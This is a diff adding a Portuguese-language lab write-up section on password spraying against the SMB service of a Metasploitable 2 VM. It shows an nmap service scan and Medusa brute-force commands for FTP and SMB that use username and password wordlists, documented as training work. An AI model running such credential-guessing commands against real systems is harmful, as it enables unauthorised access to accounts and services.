@@ -28,3 +28,22 @@ medusa -h 192.168.127.5 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
 ```
 
 ![Evidência de brute force em FTP](images/ftp_bruteforce.png)
+
+## Password Spraying em SMB com Medusa
+
+Para simular um ataque de password spraying contra o serviço SMB da máquina Metasploitable 2, reutilizei a mesma lista de usuários e defini uma lista de senhas comuns (`senhas.txt`) para serem testadas em todos os logins.
+
+Primeiro, confirmei que as portas 21, 22, 80, 139 e 445 estavam abertas no alvo com o Nmap:
+
+```bash
+nmap -sV -p 21,22,80,445,139 192.168.127.5
+```
+![Evidência de NMAP](images/nmap_bruteforce.png)
+
+Em seguida, executei o seguinte comando com o módulo `smbnt` do Medusa:
+
+```bash
+medusa -h 192.168.127.5 -U wordlists/usuarios.txt -P senhas.txt -M smbnt -t 2 -T 50
+```
+
+![Evidência de password spraying em SMB](images/medusa_smb.png)
